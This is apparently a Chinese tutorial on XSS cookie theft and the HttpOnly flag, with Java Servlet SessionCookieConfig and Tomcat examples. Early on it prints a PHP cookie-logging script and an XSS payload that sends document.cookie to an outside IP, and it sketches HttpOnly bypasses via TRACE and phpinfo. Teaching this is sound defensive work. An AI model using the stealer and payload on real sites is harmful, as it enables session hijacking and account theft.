@@ -1,0 +1,145 @@
+随着B/S的普及，我们平时上网都是依赖于http协议完成，而Http是无状态的，即同一个会话的连续两个请求互相不了解，他们由最新实例化的环境进行解析，除了应用本身可能已经存储在全局对象中的所有信息外，该环境不保存与会话有关的任何信息，http是不会为了下一次连接而维护这次连接所传输的信息的。所以为了在每次会话之间传递信息，就需要用到cookie和session，无论是什么，都是为了让服务器端获得一个token来检查合法性，很多时候都是在cookie中存储一个sessionID，服务器来识别该用户，那么安全隐患也就引申而出了，只要获得这个cookie，就可以取得别人的身份，特别是管理员等高级权限帐号时，危害就大了，而XSS就是在别人的应用程序中恶意执行一段JS以窃取用户的cookie。
+
+XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。
+
+那么如何获得Cookie劫持呢?在浏览器中的document对象中，就储存了Cookie的信息，而利用js可以把这里面的Cookie给取出来，只要得到这个Cookie就可以拥有别人的身份了。下面简单说说如何窃取cookie。
+
+接收cookie的PHP文件ck.php为：
+
+<?php 
+$cookie = $_GET['c']; 
+$ip = getenv ('REMOTE_ADDR'); 
+$time=date("j F, Y, g:i a"); 
+$referer=getenv ('HTTP_REFERER'); 
+$fp = fopen('cookie.txt', 'a'); 
+fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$time. '<br> Referer: '.$referer.'<br><br><br>'); 
+fclose($fp); 
+?>
+
+把这个文件放在自己的服务器上，比如我们搭建的服务器为：http://10.65.21.78:8080 .
+
+那么构造XSS语句：
+
+<script>window.open('http://10.65.21.78:8080/ck.php?c='+document.cookie)</script>
+
+当执行script成功时就会把cookie发送到自己的服务器下cookie.txt文件中。XSS攻击是多么可怕的事情。
+
+说了这么多，貌似还没有提到HttpOnly，这是哪般？莫及！这就到了！如何保障我们的Cookie安全呢？Cookie都是通过document对象获取的，我们如果能让cookie在浏览器中不可见就可以了，那HttpOnly就是在设置cookie时接受这样一个参数，一旦被设置，在浏览器的document对象中就看不到cookie了。而浏览器在浏览网页的时候不受任何影响，因为Cookie会被放在浏览器头中发送出去(包括Ajax的时候)，应用程序也一般不会在JS里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用JS操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。
+
+给浏览器设置Cookie的头如下：
+
+Set-Cookie: =[; =]
+[; expires=][; domain=]
+[; path=][; secure][; HttpOnly]
+
+如果 Cookie 具有 HttpOnly 特性且不能通过客户端脚本访问，则为 true；否则为 false。默认值为 false。
+
+但是，也可以看到HttpOnly并不是万能的，首先它并不能解决XSS的问题，仍然不能抵制一些有耐心的黑客的攻击，甚至一些基于XSS的proxy也出现了，但是已经可以提高攻击的门槛了，起码XSS攻击不是每个脚本小子都能完成的了，而且其他的那些攻击手法因为一些环境和技术的限制，并不像Cookie窃取这种手法一样通用。
+
+HttpOnly也是可能利用一些漏洞或者配置Bypass的，关键问题是只要能取到浏览器发送的Cookie头就可以了。譬如以前出现的Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击，这种手法也已经在Ajax和flash中获得修补。另外一个关于配置或者应用程序上可能Bypass的显著例子就是phpinfo，大家知道phpinfo会将浏览器发送的http头回显出来，其中就包括我们保护的auth信息，而这个页面经常存在在各种站点上，只要用ajax取phpinfo页面，取出header头对应的部分就可以获得Cookie了。一些应用程序的不完善也可能导致header头的泄露，这种攻击方式对于基本验证保护的页面一样可以攻击。
+
+HttpOnly在IE 6以上，Firefox较新版本都得到了比较好的支持，并且在如Hotmail等应用程序里都有广泛的使用，并且已经是取得了比较好的安全效果。
+
+那问题就来了，大家想想，HttpOnly 主要是为了限制web页面程序的browser端script程序读取cookie， 实际是浏览器通过协议实现限制的，黑客可不会那么傻，肯定不会用HTTP协议来读取cookie，肯定是在socket层面写抓包程序，相当于写一个低于IE6版本的应用程序。
+
+所以，HttpOnly并不是万能的。
+
+2.HttpOnly的设置样例
+
+
+response.setHeader("Set-Cookie", "cookiename=httponlyTest;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");
+ 例如：
+//设置cookie
+
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
+
+
+//设置多个cookie
+
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
+
+response.addHeader("Set-Cookie", "timeout=30; Path=/test; HttpOnly");
+
+
+//设置https的cookie
+
+response.addHeader("Set-Cookie", "uid=112; Path=/; Secure; HttpOnly");
+
+具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取。
+
+Cookie cookies[]=request.getCookies();  
+
+
+ 
+
+Cookie设置HttpOnly属性
+在Servlet 3.0中增加对Cookie（请注意，这里所说的Cookie，仅指和Session互动的Cookie，即人们常说的会话Cookie）较为全面的操作API。最为突出特性：支持直接修改Session ID的名称（默认为“JSESSIONID”)，支持对cookie设置HttpOnly属性以增强安全，避免一定程度的跨站攻击。防止脚本攻击,禁止了通过脚本获取cookie信息,浏览器不会将其发送给任何第三方
+利用拦截器实现，判断每次请求的响应是否包含SET-COOKIE头部，重写会话Cookie，添加需要的属性。虽较为生硬，但灵活性强。 新的规范API 新的规范添加SessionCookieConfig接口，用于操作会话Cookie，需要掌握以下主要方法：
+
+setName(String name)
+修改Session ID的名称，默认为"JSESSIONID"
+setDomain(String domain)
+设置当前Cookie所处于的域
+setPath(String path)
+设置当前Cookie所处于的相对路径
+setHttpOnly(boolean httpOnly)
+设置是否支持HttpOnly属性
+setSecure(boolean secure)
+若使用HTTPS安全连接,则需要设置其属性为true
+setMaxAge(int maxAge)
+设置存活时间，单位为秒
+如何使用呢，很方便，在ServletContextListener监听器初始化方法中进行设定即可；下面实例演示如何修改"JSESSIONID"，以及添加支持HttpOnly支持：
+
+全局设置Session-Cookie相交互部分属性
+@WebListener
+public class SessionCookieInitialization implements ServletContextListener {
+private static final Log log = LogFactory
+   .getLog(SessionCookieInitialization.class);
+
+public void contextInitialized(ServletContextEvent sce) {
+  log.info("now init the Session Cookie");
+
+  ServletContext servletContext = sce.getServletContext();
+
+  SessionCookieConfig sessionCookie = servletContext
+    .getSessionCookieConfig();
+  sessionCookie.setName("YONGBOYID");
+  sessionCookie.setPath(servletContext.getContextPath());
+  sessionCookie.setHttpOnly(true);
+  sessionCookie.setSecure(false);
+
+  log.info("name : " + sessionCookie.getName() + "\n" + "domain:"
+    + sessionCookie.getDomain() + "\npath:"
+    + sessionCookie.getPath() + "\nage:"
+    + sessionCookie.getMaxAge());
+
+  log.info("isHttpOnly : " + sessionCookie.isHttpOnly());
+  log.info("isSecure : " + sessionCookie.isSecure());
+}
+
+public void contextDestroyed(ServletContextEvent sce) {
+  log.info("the context is destroyed !");
+}
+}
+需要通过ServletContext对象获得SessionCookieConfig对象，才能够进一步自定义session cookie的属性。 无论以前的硬编码还是新的API实现，目标都是一致的，所产生头部信息也是完全一致。 毫无疑问，后者更为方便快捷，省缺了显示的操作响应元数据。 对当前站点的第一次请求，很容易从响应头信息中看到Set-Cookie的属性值：
+
+不同浏览器平台上测试 在Safari、IE8、Opera 11 一切都很正常 Firefox 3.6、Chrome 9.0，JSESSIONID会继续存在:
+
+    YONGBOYID=601A6C82D535343163B175A4FD5376EA; JSESSIONID=AA78738AB1EAD1F9C649F705EC64D92D; AJSTAT_ok_times=6; JSESSIONID=abcpxyJmIpBVz6WHVo_1s; BAYEUX_BROWSER=439-1vyje1gmqt8y8giva7pqsu1
+在所有浏览器中，SESSION ID等于新设置的YONGBOYID值（若不相等，问题就严重了！） 在客户端JS无法获得正确的SESSIONI ID了。
+
+Tomcat服务器内置支持 可以不用如上显示设置Cookie domain、name、HttpOnly支持，在conf/context.xml文件中配置即可：
+
+<Context useHttpOnly="true", sessionCookieName="YONGBOYID", sessionCookieDomain="/servlet3" … >
+...
+</Context>
+既然JAVA应用服务器本身支持会话Cookie设定，那就没有必要在程序代码中再次进行编码了。这是一个好的实践：不要重复造轮子。 这里给出一段测试Session重写的一段脚本：
+
+<div style="margin: 40px; paddding: 10px">
+<div><a href="sessionCookieTest">正常连接</a></div>
+<div><a href="<%=response.encodeURL("sessionCookieTest") %>">重定向连接</a></div>
+</div>
+会被重写的URL地址类似于：
+
+http://localhost/servlet3/sessionCookieTest;YONGBOYID=19B94935D50245270060E49C9E69F5B6 
+嗯，在取消会话Cookie之后，可以直接看到修改后的SESSION ID名称了，当然这时候HttpOnly属性也没有多大意义了。 有一点别忘记，设置HttpOnly之后，客户端的JS将无法获取的到会话ID了
